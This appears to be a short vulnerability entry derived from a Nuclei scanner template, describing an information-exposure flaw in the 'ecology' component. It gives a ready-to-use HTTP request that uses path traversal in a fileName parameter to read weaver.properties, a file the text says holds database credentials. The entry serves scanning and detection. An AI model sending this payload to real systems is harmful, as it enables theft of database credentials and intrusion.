# Vulnerability: Ecology - Information Exposure
**Classification:** ECOLOGY
**Source:** Nuclei Template (`ecology-info-leak.yaml`)

## Description
The "ecology" component exposes a file that contains sensitive database credentials (dbuser/dbpass).

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties
```

